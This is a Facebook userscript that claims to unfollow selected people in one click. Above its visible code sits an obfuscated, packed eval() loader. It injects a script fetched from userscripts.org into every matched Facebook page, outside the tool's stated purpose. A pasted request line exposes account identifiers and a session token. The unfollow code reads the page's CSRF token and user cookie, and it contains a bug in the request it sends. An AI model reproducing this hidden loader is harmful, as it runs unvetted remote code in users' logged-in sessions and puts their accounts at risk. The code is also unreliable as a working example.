// ==UserScript==
// @name          FB Unfollow all
// @version       2
// @description   Unsubscribe people in Facebook by one click
// @namespace     http://userscripts.org/users/83150
// @include       htt*://*.facebook.com/*
// @match         http://*.facebook.com/*
// @match         https://*.facebook.com/*
// @exclude       htt*://*static*.facebook.com*
// @exclude       htt*://*channel*.facebook.com*
// @exclude       htt*://developers.facebook.com/*
// @exclude       htt*://upload.facebook.com/*
// @exclude       htt*://*onnect.facebook.com/*
// @exclude       htt*://*acebook.com/connect*
// @exclude       htt*://*.facebook.com/plugins/*
// @exclude       htt*://*.facebook.com/l.php*
// @exclude       htt*://*.facebook.com/ai.php*
// @exclude       htt*://*.facebook.com/extern/*
// @exclude       htt*://*.facebook.com/pagelet/*
// @exclude       htt*://api.facebook.com/static/*
// @exclude       htt*://*.facebook.com/contact_importer/*
// @exclude       htt*://*.facebook.com/ajax/*
// @exclude       htt*://www.facebook.com/places/map*_iframe.php*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|178337|user|source|scripts|org|js'.split('|'),0,{}))


POST /ajax/follow/unfollow_profile.php profile_id=100004442953638&location=4&feed_blacklist_action=hide_followee_on_unfollow&nctr[_mod]=pagelet_collections_following&__user=100004344784116&__a=1&__dyn=7n8ahyj2qmumdDgDxrHFkUGyxi9Ay8b8&__req=9&fb_dtsg=AQBtM67s&ttstamp=2658166116775455115


(function(){
	var t=document.querySelectorAll('.profileFollowButton'),b=document.querySelector('#fbUnSub');
	if(!t||!t.length||b)return;
	var w=unsafeWindow;w.g={}; g=w.g;
	w.unSubInit = function(){
		var t=document.querySelectorAll('.profileFollowButton');
		for(var i=0;i<t.length;i++){
			var k=document.createElement('input'), p=t[i].parentNode,
			id=t[i].querySelector('input').dataset.profileid;
			k.type='checkbox';k.className='unSubCkb';k.dataset.id=id;
			p.insertBefore(k,t[i])
		}
		document.querySelector('#unSub').innerHTML='<a class="uiButton" role="button" onClick="unSubSelect();"><span class="uiButtonText">Select All</span></a><a class="uiButton" role="button" onClick="unSubInvSel();"><span class="uiButtonText">Invert Select</span></a><a class="uiButton uiButtonConfirm" role="button" onClick="unSubscribe();"><span class="uiButtonText">Proceed</span></a>';
	}
	w.unSubSelect = function(){
		var t=document.querySelectorAll('.unSubCkb');
		for(var i=0;i<t.length;i++){
			t[i].checked=true; 
		}
	}
	w.unSubInvSel = function(){
		var t=document.querySelectorAll('.unSubCkb');
		for(var i=0;i<t.length;i++){
			t[i].checked=!t[i].checked;
		}
	}
	w.generatePhstamp = function(qs, dtsg) {
		var input_len = qs.length;
		numeric_csrf_value='';
		for(var ii=0;ii<dtsg.length;ii++) {
			numeric_csrf_value+=dtsg.charCodeAt(ii);
		}
		return '1' + numeric_csrf_value + input_len;
	}
	w.unSubscribe = function(){
		if(!g.tUrl){
			g.tUrl=[];
			var t=document.querySelectorAll('.unSubCkb:checked');
			g.fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;
			g.__user=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
			for(var i=0;i<t.length;i++){
				var id=t[i].dataset.id;
				f='profile_id='+id+'&location=4&feed_blacklist_action=hide_followee_on_unfollow&nctr[_mod]=pagelet_collections_following&__user='+g.__user+'&__a=1&__req=j&fb_dtsg='+g.fb_dtsg;
				f=f+'&phstamp='+w.generatePhstamp(f,g.fb_dtsg)
				g.tUrl[i]=f;
			}
		}
		var t=g.tUrl;
		if(t[0]){
			t=t[0];g.tUrl.shift();
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/ajax/follow/unfollow_profile.php', true);
			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xhr.onreadystatechange = function(e) {
				if (this.readyState == 4 && this.status == 200) {
					w.unSubscribe();
				}
			};
			xhr.send(f);
		}else{
			location.reload();
		}
	}
	var k=document.createElement('div');
	k.id='unSub';k.innerHTML='<a id="fbUnSub" class="uiButton" role="button" onClick="unSubInit();"><span class="uiButtonText">FB Unsubscribe</span></a>';
	var t=document.querySelector('.fbProfileBrowserList');
	if(t&&!document.querySelector('#unSub'))t.insertBefore(k,t.firstChild);
})();

